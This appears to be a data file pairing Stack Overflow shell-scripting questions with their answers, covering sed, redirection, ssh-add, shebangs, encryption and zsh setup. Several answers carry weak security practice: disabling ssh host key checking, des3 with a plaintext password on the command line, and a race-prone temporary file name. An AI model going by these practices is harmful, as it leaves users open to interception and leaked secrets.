    "How do I insert text to the 1st line of a file using sed?": "Suppose you have a file like this:\none\ntwo\nThen to append to the first line:\n$ sed '1 s_$_/etc/example/live/example.com/fullchain.pem;_' file\none/etc/example/live/example.com/fullchain.pem;\ntwo\nTo insert before the first line:\n$ sed '1 i /etc/example/live/example.com/fullchain.pem;' file\n/etc/example/live/example.com/fullchain.pem;\none\ntwo\nOr, to append after the first line:\n$ sed '1 a /etc/example/live/example.com/fullchain.pem;' file\none\n/etc/example/live/example.com/fullchain.pem;\ntwo\nNote the number 1 in those sed expressions - that's called the address in sed terminology. It tells you on which line the command that follows is to operate.\nIf your file doesn't contain the line you're addressing, the sed command won't get executed. That's why you can't insert/append on line 1, if your file is empty.\nInstead of using stream editor, to append (to empty files), just use a shell redirection >>:\necho \"content\" >> file",
    "wait one process to finish and execute another process": "You can achieve a simple way of process synchronization in bash using wait which waits for one or more number of background jobs to complete before running the next.\nYou generally run jobs in the background by appending the & operator to the end of a command. At that point the PID (process ID) of the newly created background process is stored in a special bash variable: $! and wait command allows this process to be terminate before running the next instruction.\nThis can be demonstrated by a simple example\n$ cat mywaitscript.sh\n\n#!/bin/bash\n\nsleep 3 &\n\nwait $!     # Can also be stored in a variable as pid=$!\n\n# Waits until the process 'sleep 3' is completed. Here the wait on a single process is done by capturing its process id\n\necho \"I am waking up\"\n\nsleep 4 &\nsleep 5 &\n\nwait                    # Without specifying the id, just 'wait' waits until all jobs started on the background is complete.\n\necho \"I woke up again\"\nCommand ouput\n$ time ./mywaitscript.sh\nI am waking up\nI woke up again\n\nreal    0m8.012s\nuser    0m0.004s\nsys     0m0.006s\nYou can see the script has taken ~8s to run to completion. The breakdown on the time is\nsleep 3 will take full 3s to complete its execution\nsleep 4 and sleep 5 are both started sequentially one after next and it has taken the max(4,5) which is approximately ~5s to run.\nYou can apply the similar logic to your question above. Hope this answers your question.",
    "Debug gradle test from within eclipse": "The gradle option is -Dtest.debug. Then you can connect via eclipse on port 5005.",
    "how to write foreach in one line in csh?": "This method works for me:\nprintf 'foreach f ( 1 2 3 )\\n echo $f \\n end' | tcsh",
    "Execute command multiple times with curly brackets arguments list": "That's called Brace Expansion, which expands to a space-separated list of the given strings.\nSo touch {a,b,c} would be equivalent to\ntouch a b c\nWhile touch {a,b,c}x would be equivalent to:\ntouch ax bx cx\nYou pear command would essentially be run as:\npear channel-discover pear.phpunit.de pear.symfony-project.com\nwhich may not be what you expected. If you want the command to be run once for each string, use a for loop (which answers your 2nd question), or use a combination of brace expansion and xargs.",
    "Bash script to change parent shell directory [duplicate]": "You can technically source your script to run it in your parent shell instead of spawning a subshell to run it. This way whatever changes you make to your current shell (including changing directories) persist.\nsource /path/to/my/script/script\nor\n. /path/to/my/script/script\nBut sourcing has its own dangers, use carefully.\n(Peripherally related: how to use scripts to change directories)",
    "How to set environment variables using Fabric": "You can use fabric.context_managers.shell_env to export a variable to bash for your shell and all subshells spawned from it - but those variables won't persist beyond the shell that they were defined for (so you can't set environmental variables for the parent shell from a fabric script the way your example has it).\nYou can set up a bash script that you source for your local environment that is identical to what you would add to ~/.profile in your production slug (in its keys, not necessarily its values) and use fabric.context_managers.prefix to source that file before you run your local commands.",
    "How to run sh file from another sh file": "Take a look at this. If you want to run a script you can use:\n./yourscript.sh\nIf your script has a loop, use:\n./yourscript.sh&\nIf you want to get the console after starting scripts and you don't want to see it's output use:\n./yourscript.sh > /dev/null 2>&1 &\nSo, in the master file you'll have:\n./yourscript1.sh > /dev/null 2>&1 &\n./yourscript2.sh > /dev/null 2>&1 &\n./yourscript3.sh > /dev/null 2>&1 &\nThey will start together.",
    "How to pass an array to a bash function": "#!/bin/bash\nar=( a b c )\ntest() {\n    local ref=$1[@]\n    echo ${!ref}\n}\n\ntest ar",
    "fastest hashing in a unix environment?": "The cksum utility calculates a non-cryptographic CRC checksum.",
    "Pipe command output, but keep the error code [duplicate]": "Use ${PIPESTATUS[0]} to get the exit status of the first command in the pipe.\nFor details, see http://tldp.org/LDP/abs/html/internalvariables.html#PIPESTATUSREF\nSee also http://cfajohnson.com/shell/cus-faq-2.html for other approaches if your shell does not support $PIPESTATUS.",
    "Interactive search and replace from shell": "KISS principle:\nvim\n:args `ls`\n:argdo %s#SEARCH#REPLACE#gec |update\nFirst character afer %s is used as separator",
    "Set environment variables for non-interactive shell": "Solution for Ubuntu: set the variables in /etc/environment, and it works for all users and all types of shells.",
    "how to simulate pressing an arrow key in linux bash": "Use Xdotool. Its usage is:\nxdotool key SPECIFY_KEY\nand replace SPECIFY_KEY with the required keystroke,\nor in your case:\nxdotool key Up/Down/etc.",
    "diff on columns of two files in shell": "Try this:\ndiff <(cut -f1,3 file1) <(cut -f1,3 file2)\nReferences:\nCompare two files line by line and generate the difference in another file",
    "How to pass an ssh key passphrase via environment variable": "So there are actually a few things that is important for what you are trying to do:\nDISPLAY must be set\nit must not have a terminal associated with it\non some machines it may be necessary to redirect the input from /dev/null (mine is one of them).\nSSH_ASKPASS must contain an executable which outputs the passphrase on stdout.\nSo for an example of getting it to work (for me, should work on other linux also I guess):\nCreate dummy key:\nssh-keygen -t rsa -C se-so-38354773 -f /tmp/se-so-38354773.key -N 'se-so-38354773-pp'\nCreate askpass script to echo password files:\ncat > /tmp/se-so-38354773-askpass <<EOF\n#!/usr/bin/env bash\necho \"${0}:${@} : this is for debugging to see if the echo script runs\" 1>&2\necho \"se-so-38354773-pp\"\nEOF\nchmod +x /tmp/se-so-38354773-askpass\nI placed this file in /tmp/ - but this is not a good for security unless you also change permissions on the file before writing to it to ensure that nobody else can read it (or set umask).\nThen you can do ssh-add as follow:\nDISPLAY=\":0.0\" SSH_ASKPASS=\"/tmp/se-so-38354773-askpass\" setsid ssh-add /tmp/se-so-38354773.key </dev/null\nThe setsid dissociates it from your terminal if there is one - This is not needed on my computer though - but yeah - I think it may be needed in some other contexts.\nAnd when you are done testing do clean up:\nssh-add -d /tmp/se-so-38354773.key\nrm /tmp/se-so-38354773*\nExample output on my computer:\niwana@iwana-nb.concurrent.co.za:~/projects/gitlab.com/aucampia/stackexchange/stackoverflow/38354773\n$ ssh-keygen -t rsa -C se-so-38354773 -f /tmp/se-so-38354773.key -N 'se-so-38354773-pp'\nGenerating public/private rsa key pair.\nYour identification has been saved in /tmp/se-so-38354773.key.\nYour public key has been saved in /tmp/se-so-38354773.key.pub.\nThe key fingerprint is:\nSHA256:s+jVUPEyb2DzRM5y+Hm3XDzVRREKn5yU2d0hk61hIQ0 se-so-38354773\nThe key's randomart image is:\n+---[RSA 2048]----+\n|          .E+=B=O|\n|           B*B*o=|\n|          X B*o o|\n|         o % o ..|\n|        S   * ..+|\n|       . = . ...+|\n|      . o .    o |\n|     . .         |\n|      .          |\n+----[SHA256]-----+\niwana@iwana-nb.concurrent.co.za:~/projects/gitlab.com/aucampia/stackexchange/stackoverflow/38354773\n$ \niwana@iwana-nb.concurrent.co.za:~/projects/gitlab.com/aucampia/stackexchange/stackoverflow/38354773\n$ cat > /tmp/se-so-38354773-askpass <<EOF\n> #!/usr/bin/env bash\n> echo \"${0}:${@} : this is for debugging to see if the echo script runs\" 1>&2\n> echo \"se-so-38354773-pp\"\n> EOF\niwana@iwana-nb.concurrent.co.za:~/projects/gitlab.com/aucampia/stackexchange/stackoverflow/38354773\n$ chmod +x /tmp/se-so-38354773-askpass\niwana@iwana-nb.concurrent.co.za:~/projects/gitlab.com/aucampia/stackexchange/stackoverflow/38354773\n$ \niwana@iwana-nb.concurrent.co.za:~/projects/gitlab.com/aucampia/stackexchange/stackoverflow/38354773\n$ DISPLAY=\":0.0\" SSH_ASKPASS=\"/tmp/se-so-38354773-askpass\" setsid ssh-add /tmp/se-so-38354773.key </dev/null\niwana@iwana-nb.concurrent.co.za:~/projects/gitlab.com/aucampia/stackexchange/stackoverflow/38354773\n$ \nbash: : this is for debugging to see if the echo script runs\nIdentity added: /tmp/se-so-38354773.key (/tmp/se-so-38354773.key)\niwana@iwana-nb.concurrent.co.za:~/projects/gitlab.com/aucampia/stackexchange/stackoverflow/38354773\n$ ssh-add -d /tmp/se-so-38354773.key\nIdentity removed: /tmp/se-so-38354773.key (se-so-38354773)\niwana@iwana-nb.concurrent.co.za:~/projects/gitlab.com/aucampia/stackexchange/stackoverflow/38354773\n$ rm /tmp/se-so-38354773*",
    "Relative shebang: How to write an executable script running portable interpreter which comes with it": "The missing \"punchline\" from Anton's answer:\nWith an updated version of env, we can now realize the initial idea:\n#!/usr/bin/env -S /bin/sh -c '\"$(dirname \"$0\")/python3\" \"$0\" \"$@\"'\nNote that I switched to python3, but this question is really about shebang - not python - so you can use this solution with whatever script environment you want. You can also replace /bin/sh with just sh if you prefer.\nThere is a lot going on here, including some quoting hell, and at first glance it's not clear what's happening. I think there's little worth to just saying \"this is how to do it\" without explanation, so let's unpack it.\nIt breaks down like this:\nThe shebang is interpreted to run /usr/bin/env with the following arguments:\n-S /bin/sh -c '\"$(dirname \"$0\")/python3\" \"$0\" \"$@\"'\nfull path (either local or absolute) to the script file\nonwards, any extra commandline arguments\nenv finds the -S at the start of the first argument, and splits it according to (simplified) shell rules. In this case, only the single-quotes are relevant - all the other fancy syntax is within single-quotes so it gets ignored. The new arguments to env become:\n/bin/sh\n-c\n\"$(dirname \"$0\")/python3\" \"$0\" \"$@\"\nfull path to script file (either local or absolute)\nonwards, (possibly) extra arguments\nIt runs /bin/sh - the default shell - with the arguments:\n-c\n\"$(dirname \"$0\")/python3\" \"$0\" \"$@\"\nfull path to script file\nonwards, (possibly) extra arguments\nAs the shell was run with -c, it runs in the second operating mode defined here (and also re-described many times by different man pages of all shells, e.g. dash, which is much more approachable). In our case we can ignore all the extra options, the syntax is:\n sh -c command_string command_name [argument ...]\nIn our case:\ncommand_string is \"$(dirname \"$0\")/python3\" \"$0\" \"$@\"\ncommand_name is the script path, e.g. ./path to/script dir/script file.py\nargument(s) are any extra arguments (it's possible to have zero arguments)\nAs described, the shell wants to run command_string (\"$(dirname \"$0\")/python3\" \"$0\" \"$@\") as a command, so now we turn to the Shell Command Language:\nParameter Expansion is performed on \"$0\" and \"$@\", which are both Special Parameters:\n\"$@\" expands to the argument(s). If there were no arguments, it will \"expand\" into nothing. Because of this special behaviour, it's explained horribly in the spec I linked, but the man page for dash explains it much better.\n$0 expands to command_name - our script file. Every occurrence of $0 is within double-quotes so it doesn't get split, i.e. spaces in the path won't break it up into multiple arguments.\nCommand Substitution is applied, substituting $(dirname \"$0\") with the standard output of running the command dirname \"./path to/script dir/script file.py\", i.e. the folder that our script file resides in: ./path to/script dir.\nAfter all of the substitutions and expansions, the command becomes, for example:\n \"./path to/script dir/python3\" \"./path to/script dir/script file.py\" \"first argument\" \"second argument\" ...\nFinally, the shell runs the expanded command, and executes our local python3 with our script file as an argument followed by any other arguments we passed to it.\nPhew!\nWhat follows is basically my attempts to demonstrate that those steps are occuring. It's probably not worth your time, but I already wrote it and I don't think it's so bad that it should be removed. If nothing else, it might be useful to someone if they want to see an example of how to reverse-engineer things like this. It doesn't include extra arguments, those were added after Emanuel's comment.\nIt also has a lousy joke at the end..\nFirst let's start simpler. Take a look at the following \"script\", replacing env with echo:\n$ cat \"/home/neatnit/Projects/SO question 33225082/my script.py\"\n#!/usr/bin/echo  -S  /bin/sh  -c  '\"$(  dirname  \"$0\"  )/python2.7\"  \"$0\"'\n\nprint(\"This is python\")\nIt's hardly a script - the shebang calls echo which will just print whichever arguments it's given. I've deliberately put two spaces between the words, this way we can see how they get preserved. As an aside, I've deliberately put the script in a path that contains spaces, to show that they are handled correctly.\nLet's run it:\n$ \"/home/neatnit/Projects/SO question 33225082/my script.py\"\n-S  /bin/sh  -c  '\"$(  dirname  \"$0\"  )/python2.7\"  \"$0\"' /home/neatnit/Projects/SO question 33225082/my script.py\nWe see that with that shebang, echo is run with two arguments:\n-S  /bin/sh  -c  '\"$(  dirname  \"$0\"  )/python2.7\"  \"$0\"'\n/home/neatnit/Projects/SO question 33225082/my script.py\nThese are the literal arguments echo sees - no quoting or escaping.\nNow, let's get env back but use printf [1] ahead of sh to explore how env processes these arguments:\n$ cat \"/home/neatnit/Projects/SO question 33225082/my script.py\"\n#!/usr/bin/env  -S  printf  %s\\n  /bin/sh  -c  '\"$(  dirname  \"$0\"  )/python2.7\"  \"$0\"'\n\nprint(\"This is python\")\nAnd run it:\n$ \"/home/neatnit/Projects/SO question 33225082/my script.py\"\n/bin/sh\n-c\n\"$(  dirname  \"$0\"  )/python2.7\"  \"$0\"\n/home/neatnit/Projects/SO question 33225082/my script.py\nenv splits the string after -S [2] according to ordinary (but simplified) shell rules. In this case, all $ symbols were within single-quotes, so env did not expand them. It then appended the additional argument - the script file - to the end.\nWhen sh gets these arguments, the first argument after -c (in this case: \"$(  dirname  \"$0\"  )/python2.7\"  \"$0\") gets interpreted as a shell command, and the next argument acts as the first parameter in that command ($0).\nPushing the printf one level deeper:\n$ cat \"/home/neatnit/Projects/SO question 33225082/my script.py\"\n#!/usr/bin/env  -S  /bin/sh  -c  'printf  %s\\\\\\n  \"$(  dirname  \"$0\"  )/python2.7\"  \"$0\"'\n\nprint(\"This is python\")\nAnd running it:\n$ \"/home/neatnit/Projects/SO question 33225082/my script.py\"\n/home/neatnit/Projects/SO question 33225082/python2.7\n/home/neatnit/Projects/SO question 33225082/my script.py\nAt last - it's starting to look like the command we were looking for! The local python2.7 and our script as an argument!\nsh expanded $0 into /home/[ ... ]/my script.py, giving this command:\n\"$(  dirname  \"/home/[ ... ]/my script.py\"  )/python2.7\"  \"/home/[ ... ]/my script.py\"\ndirname snips off the last part of the path to get the containing folder, giving this command:\n\"/home/[ ... ]/SO question 33225082/python2.7\"  \"/home/[ ... ]/my script.py\"\nTo highlight a common pitfall, this is what happens if we don't use double-quotes and our path contains spaces:\n$ cat \"/home/neatnit/Projects/SO question 33225082/my script.py\"\n#!/usr/bin/env  -S  /bin/sh  -c  'printf  %s\\\\\\n  $(  dirname  $0  )/python2.7  $0'\n\nprint(\"This is python\")\n$ \"/home/neatnit/Projects/SO question 33225082/my script.py\"\n/home/neatnit/Projects\n.\n33225082\n./python2.7\n/home/neatnit/Projects/SO\nquestion\n33225082/my\nscript.py\nNeedless to say, running this as a command would not give the desired result. Figuring out exactly what happened here is left as an exercise to the reader :)\nAt last, we put the quote marks back where they belong and get rid of the printf, and we finally get to run our script:\n$ \"/home/neatnit/Projects/SO question 33225082/my script.py\"\n/home/neatnit/Projects/SO question 33225082/my script.py: 1: /home/neatnit/Projects/SO question 33225082/python2.7: not found\nWait, uh, let me fix that\n$ ln --symbolic $(which python3) \"/home/neatnit/Projects/SO question 33225082/python2.7\"\n$ \"/home/neatnit/Projects/SO question 33225082/my script.py\"\nThis is python\nRejoice!\n[1] This way we can see each argument in a separate line, and we don't have to get confused by space-delimited arguments.\n[2] There doesn't need to be a space after -S, I just prefer the way it looks. -Sprintf sounds really exhausting.",
    "Wait for Network Interface Before Executing Command": "This command should wait until it can contact google or it has tried 50 times:\nfor i in {1..50}; do ping -c1 www.google.com &> /dev/null && break; done\nThe for i in {1..50} loops 50 times or until a break is executed. The ping -c1 www.google.com sends 1 ping packet to google, and &> /dev/null redirects all the output to null, so nothing is outputed. && break executes break only if the previous command finished successfully, so the loop will end when ping is successful.",
    "Tput color definitions for windows git shell": "you could use ANSI color escape codes, as in this script:\nif tput setaf 1 &> /dev/null; then\n    tput sgr0\n    if [[ $(tput colors) -ge 256 ]] 2>/dev/null; then\n      MAGENTA=$(tput setaf 9)\n      ORANGE=$(tput setaf 172)\n      GREEN=$(tput setaf 190)\n      PURPLE=$(tput setaf 141)\n      WHITE=$(tput setaf 256)\n    else\n      MAGENTA=$(tput setaf 5)\n      ORANGE=$(tput setaf 4)\n      GREEN=$(tput setaf 2)\n      PURPLE=$(tput setaf 1)\n      WHITE=$(tput setaf 7)\n    fi\n    BOLD=$(tput bold)\n    RESET=$(tput sgr0)\nelse\n    MAGENTA=\"\\033[1;31m\"\n    ORANGE=\"\\033[1;33m\"\n    GREEN=\"\\033[1;32m\"\n    BLUE=\"\\033[1;34m\"\n    PURPLE=\"\\033[1;35m\"\n    WHITE=\"\\033[1;37m\"\n    BOLD=\"\"\n    RESET=\"\\033[m\"\nfi\nYou use it as:\nPS1=\"\\[$WHITE\\]\\[$BOLD\\]\\u\\[$RESET\\]@\\[$WHITE\\]\\[$BOLD\\]\\h\\[$RESET\\]:\\[\\033[01;34m\\]\\[$BOLD\\]\\w\\[$WHITE\\]\\$([[ -n \\$(git branch 2> /dev/null) ]] && echo \\\" \\[$RESET\\]on \\\")\\[$WHITE\\]\\[$BOLD\\]\\$(parse_git_branch)\\[$RESET\\]\\n\\$ \\[$RESET\\]\"",
    "How to create a temporary file with portable shell in a secure way?": "Why not use /dev/random?\nIt could be neater with perl but od and awk will do, something like:\ntempfile=XXX-$(od -N4 -tu /dev/random | awk 'NR==1 {print $2} {}')",
    "Problem with backticks in shellscript": "You need to use eval to get it working\nresult=`eval ${ECHO_CMD}`;\nin place of\nresult=`${ECHO_CMD}`;\nWithout eval\n${ECHO_TEXT} | awk -F' ' '{print \\$1}\nwhich will be expanded to\nEcho this | awk -F' ' '{print \\$1}\nwill be treated as argument to echo and will be output verbatim. With eval that line will actually be run.",
    "test for regex in string with a posix shell": "You can use expr command to evaluate regular expression in a POSIX shell:\ns='Abc'\nexpr $s : '^[[:alpha:]]\\+'\n\n3\nexpr returns # of matched characters which is 3 in this case.",
    "How to understand diff -u in linux?": "From Wikipedia (diff utility):\nThe unified format (or unidiff) inherits the technical improvements made by the context format, but produces a smaller diff with old and new text presented immediately adjacent. Unified format is usually invoked using the \"-u\" command line option. This output is often used as input to the patch program. Many projects specifically request that \"diffs\" be submitted in the unified format, making unified diff format the most common format for exchange between software developers.\n...\nThe format starts with the same two-line header as the context format, except that the original file is preceded by \"---\" and the new file is preceded by \"+++\". Following this are one or more change hunks that contain the line differences in the file. The unchanged, contextual lines are preceded by a space character, addition lines are preceded by a plus sign, and deletion lines are preceded by a minus sign.\nA hunk begins with range information and is immediately followed with the line additions, line deletions, and any number of the contextual lines. The range information is surrounded by double-at signs, and combines onto a single line what appears on two lines in the context format (above). The format of the range information line is as follows:\n    @@ -l,s +l,s @@ optional section heading\n...\nThe idea of any format that diff throws at you is to transform a source file into a destination file following a series of steps. Let's see a simple example of how this works with unified format.\nGiven the following files:\nfrom.txt\na\nb\nto.txt\na\nc\nThe output of diff -u from.txt to.txt is:\n--- frokm.txt   2015-03-17 04:34:47.076997087 -0430\n+++ to.txt      2015-03-17 04:35:27.872996388 -0430\n@@ -1,2 +1,2 @@\n a\n-b\n+c\nExplanation. Header description:\n--- from.txt    2015-03-17 22:42:18.575039925 -0430  <-- from-file time stamp\n+++ to.txt      2015-03-17 22:42:10.495040064 -0430  <-- to-file time stamp\nThis diff contains just one hunk (only one set of changes to turn file form.txt into to.txt):\n@@ -1,2 +1,2 @@  <-- A hunk, a block describing chages between both files, there could be several of these in the diff -u output\n   ^    ^\n   |   (+) means that this change starts at line 1 and involves 2 lines in the to.txt file\n  (-) means that this change starts at line 1 and involves 2 lines of the from.txt file\nNext, the list of changes:\n a   <-- This line remains the same in both files, so it won't be changed\n-b   <-- This line has to be removed from the \"from.txt\" file to transform it into the \"to.txt\" file\n+c   <-- This line has to be added to the \"from.txt\" file to transform it into the \"to.txt\" file\nHere are some StackOverflow answers with really nice info about this subject:\nhttps://stackoverflow.com/a/10950496/1041822\nhttps://stackoverflow.com/a/2530012/1041822\nAnd some other useful documentation:\nhttps://linuxacademy.com/blog/linux/introduction-using-diff-and-patch/ http://www.artima.com/weblogs/viewpost.jsp?thread=164293",
    "tar command: what is dash for? [closed]": "The very first dash is unnecessary, you could equally write:\ntar cvf ...\nThe second dash belongs with the f option and it says \"instead of creating a named file in the filesystem, write the tarred up files onto stdout\".\nThat stdout is then passed through the pipe into ssh. The corresponding untar on the remote machine is untarring from its stdin in exactly the same way.\nSo, in answer to your question, the dashes mean stdout when creating/writing a tarfile with tar cf and stdin when extracting/reading a tarfile with tar xf",
    "How does cmd > /dev/null 2>&1 work?": "You are right, 2 is STDERR, 1 is STDOUT. When you do 2>&1 you are saying: \"print to STDOUT (1) the things that would go to STDERR (2)\". And before that, you said your STDOUT would go to /dev/null. Therefore, nothing is seen. In the examples 1 and 2 you get the output message because it is being printed to STDERR, as a regular redirection only redirects STDOUT.\nAnd when you do the redirection, you are not creating a STDERR, the processes always have a STDERR and a STDOUT when they are created.",
    "Is it possible to use GitHub secrets inside my shell file?": "",
    "Open Terminal from shell and execute commands [duplicate]": "Option 1 with xterm (will automatically close the window when completed):\nxterm -e \"cd /tmp/; watch 'pwd;date'\"\nOption 2 with MacOS terminal:\nosascript -e 'tell application \"Terminal\" to do script \"cd /tmp;pwd\"'",
    "Zsh menu completion causes problems after zle reset-prompt": "I found this workaround, to basically prevent calling \"reset-prompt\" when in a menu selection :\nTRAPALRM() {\n    if [ \"$WIDGET\" != \"complete-word\" ]; then\n        zle reset-prompt\n    fi\n}\nNote that complete-word may be different for you; I found it with an echo $WIDGET in the TRAPALRM call.",
    "Is there a shell command to delay a buffer?": "I know you said you're looking for a shell command, but what about using a subshell to your advantage? Something like:\ncommand_a | (sleep 5; command_b)\nSo to grep a file cat-ed through (I know, I know, bad use of cat, but just an example):\ncat filename | (sleep 5; grep pattern)\nA more complete example:\n$ cat testfile\nThe\nquick\nbrown\nfox\n$ cat testfile | (sleep 5; grep brown)\n# A 5-second sleep occurs here\nbrown\nOr even, as Michale Kropat recommends, a group command with sleep would also work (and is arguably more correct). Like so:\n$ cat testfile | { sleep 5; grep brown; }\nNote: don't forget the semicolon after your command (here, the grep brown), as it is necessary!",
    "How do I run many SSH remote commands, on multiple machines, in batch?": "Your use of ConnectTimeout is correct, so it is not obvious why it only times out after 30 or more seconds.\nHere's how I would change your script to avoid the timeout problem entirely:\nUse GNU parallel to connect to more than one destination host at the same time.\nUse the -f option to SSH to process it in the background.\nHere is a solution with GNU parallel, running at most 50 connections at the same time:\nparallel --gnu --bg --jobs 50 \\\nssh -o BatchMode=yes \\\n    -o StrictHostKeyChecking=no \\\n    -o ConnectTimeout=10 \\\n    -l ${USERNAME} \\\n    {} \\\n    \"${COMMAND} -i {} || echo timeout\" \\\n::: ${IP}\nparallel <command> ::: <arguments> will execute <command> <argument> many times in parallel by splitting the <arguments> list. The placeholder for <argument> is {}.\nUse parallel --jobs n to limit the number of parallel connections.",
    "Passing An Array From One Bash Script to Another": "Your way of passing the array is correct\n./scriptTwo.sh \"${array[@]}\"\nThe problem is probably in the way how you receive it. In scriptTwo.sh, use\narray=(\"$@\")",
    "Bash Script, Kill process by pulling from PID file": "Edit the script that starts glassfish and place something like echo $$ > /path/to/PID-file (this can contain ~ for home directory or some other mechanism like $USER to make user specific) on the line immediately following the line starting the process. You can then kill the correct process using kill $(cat /path/to/PID-file).",
    "How to kill Django runserver sub processes from a bash script?": "SOLVED\nThanks to this SO question, I've changed my script to this:\n#!/bin/bash\nSITE=/home/dev/sites/rmx\n\necho \"RMX using siteroot=$SITE\"\n$SITE/rmx/manage.py runserver &\ncompass watch $SITE/media/compass/ &\ncoffee -o $SITE/media/js -cw $SITE/media/coffee &\nhamlpy-watcher $SITE/templates/hamlpy $SITE/templates/templates &\n\ntrap \"kill -TERM -$$\" SIGINT\n\nwait\nPIDs preceded with the dash operate on the PID group with the kill command, and the $$ references the PID of the bash script itself.\nThanks for the help, me!\nNo problem, self, and hey -- you're awesome.",
    "Get seconds since epoch in any POSIX compliant shell": "Here is a portable / POSIX solution:\nPATH=`getconf PATH` awk 'BEGIN{srand();print srand()}'\nUnlike a C compiler or Perl, awk is guaranteed to be present on a POSIX compliant environment.\nHow it works:\nPATH=`getconf PATH` is making sure the POSIX version of awk is called should it not be the first one in the PATH.\nPer the POSIX standard : srand([expr]) Set the seed value for rand to expr or use the time of day if expr is omitted. The previous seed value shall be returned.\nThe first call is omitting a parameter so the seed value is set to the time of day. The second call is returning that time of day, which is the number of seconds since the epoch.\nNote that with many awk implementations but not the GNU one (gawk), this first call is not required as the function already returns the expected value in the first place.",
    "How can we get the union of two arrays in Bash?": "First, combine the arrays:\narr3=(\"${arr1[@]}\" \"${arr2[@]}\")\nThen, apply the solution from this post to deduplicate them:\n# Declare an associative array\ndeclare -A arr4\n# Store the values of arr3 in arr4 as keys.\nfor k in \"${arr3[@]}\"; do arr4[\"$k\"]=1; done\n# Extract the keys.\narr5=(\"${!arr4[@]}\")\nThis assumes bash 4+.",
    "What is the meaning of !#:3?": "In bash or zsh ! denotes a history command (not a shebang line which is #!, and has nothing to do with bash or zsh as such).\n!# means the entire command line typed so far, and :3 selects the third word, in this case ~/bin/ack.\nSo the command is equivalent to:\n curl http://beyondgrep.com/ack-2.02-single-file > ~/bin/ack && chmod 0755 ~/bin/ack",
    "Unix cut: Print same Field twice": "You can't print the same field twice. cut prints a selection of fields (or characters or bytes) in order. See Combining 2 different cut outputs in a single command? and Reorder fields/characters with cut command for some very similar requests.\nThe right tool to use here is awk, if your CSV doesn't have quotes around fields.\nawk -F , -v OFS=, '{print $1, $4, $4}'\nIf you don't want to use awk (why? what strange system has cut and sed but no awk?), you can use sed (still assuming that your CSV doesn't have quotes around fields). Match the first four comma-separated fields and select the ones you want in the order you want.\nsed -e 's/^\\([^,]*\\),\\([^,]*\\),\\([^,]*\\),\\([^,]*\\)/\\1,\\4,\\4/'",
    "Encrypt a file using bash shell script": "Try something like this -\nopenssl des3 -salt -in /pritom/uaeyha_com.sql -out /pritom/a.ss -pass pass:pritom\nFrom the man page:\nPASS PHRASE ARGUMENTS\n         Several commands accept password arguments, typically using -passin and -passout for input and output\n         passwords respectively. These allow the password to be obtained from a variety of sources. Both of these\n         options take a single argument whose format is described below. If no password argument is given and a\n         password is required then the user is prompted to enter one: this will typically be read from the current\n         terminal with echoing turned off.\n   pass:password\n             the actual password is password. Since the password is visible to utilities (like 'ps' under Unix)\n             this form should only be used where security is not important.\n\n   env:var   obtain the password from the environment variable var. Since the environment of other processes is\n             visible on certain platforms (e.g. ps under certain Unix OSes) this option should be used with\n             caution.\n\n   file:pathname\n             the first line of pathname is the password. If the same pathname argument is supplied to -passin and\n             -passout arguments then the first line will be used for the input password and the next line for the\n             output password. pathname need not refer to a regular file: it could for example refer to a device\n             or named pipe.\n\n   fd:number read the password from the file descriptor number. This can be used to send the data via a pipe for\n             example.\n\n   stdin     read the password from standard input.",
    "What is the `< <()` syntax?": "The first one is input redirection. It feeds the contents of a file into the program as input. The second construct is <() and it's process redirection: it treats output of a process like a file. In this case, the effect is that you will run the contents of that url as though it was a bash script -- very dangerous! If you don't trust to source completely, don't do that. An attacker could use this method to have you run commands that would compromise your system.",
    "Linux shell (bash) on vi's splitview": "Have you tried looking for third-party Vim plugins? Conque Shell looks like it might do the job.",
    "How to detect OS and load ZSH settings conditionally?": "Revised Answer (2020-Feb-09)\nThanks to @Cyberbeni for reminding me that apt on macOS would incorrectly match the system Java runtime's Annotation Processing Tool. Rolling up the necessary changes, we now have:\n# What OS are we running?\nif [[ $(uname) == \"Darwin\" ]]; then\n    source \"$ZSH_CUSTOM\"/os/mac.zsh\n\nelif command -v freebsd-version > /dev/null; then\n    source \"$ZSH_CUSTOM\"/os/freebsd.zsh\n\nelif command -v apt > /dev/null; then\n    source \"$ZSH_CUSTOM\"/os/debian.zsh\n\nelse\n    echo 'Unknown OS!'\nfi\n\n# Do we have systemd on board?\nif command -v systemctl > /dev/null; then\n    source \"$ZSH_CUSTOM\"/os/systemd.zsh\nfi\n\n# Ditto Kubernetes?\nif command -v kubectl > /dev/null; then\n    source \"$ZSH_CUSTOM\"/os/kubernetes.zsh\nfi\nOriginal answer\nI answered exactly the same question on Reddit here, so to close the loop, here's what I wrote:\nYour current logic literally says that, for instance, a Debian system cannot possibly run systemd or Kubernetes, which is clearly untrue. That's exactly what if...elif...else...fi implements: mutual exclusivity.\nIt looks to me like only the OS-specific tests need to be mutually exclusive, so you're probably looking at something like:\n# What OS are we running?\nif command apt > /dev/null; then\n    source $ZSH_CUSTOM/os/debian.zsh\n\nelif command freebsd-version > /dev/null; then\n    source $ZSH_CUSTOM/os/freebsd.zsh\n\nelif [[ `uname` == \"Darwin\" ]]; then\n    source $ZSH_CUSTOM/os/mac.zsh\n\nelse\n    echo 'Unknown OS!'\nfi\n\n# Do we have systemd on board?\nif command systemctl > /dev/null; then\n    source $ZSH_CUSTOM/os/systemd.zsh\nfi\n\n# Ditto Kubernetes?\nif command kubectl > /dev/null; then\n    source $ZSH_CUSTOM/os/kubernetes.zsh\nfi\nUPDATE: Actually, I didn't look closely enough at your code, and you're also calling command wrong. All your invocations should be of the form:\nif command -v <cmd_name> > /dev/null\nwhich returns success if <cmd_name> is found in your PATH. command <cmd_name> actually runs <cmd_name> and returns its exit status, which can return a failure exit code (i.e. false negative) due to lack of appropriate arguments.",
    "Using Curl data binary option, out of memory": "The reason for the out of memory is that --data and its friends all read the data into memory before sending it off to the server. You can work around that easily by doing -T -X POST, but I still believe you went wrong already in your initial -F test.\nFrom: https://github.com/curl/curl/issues/1385",
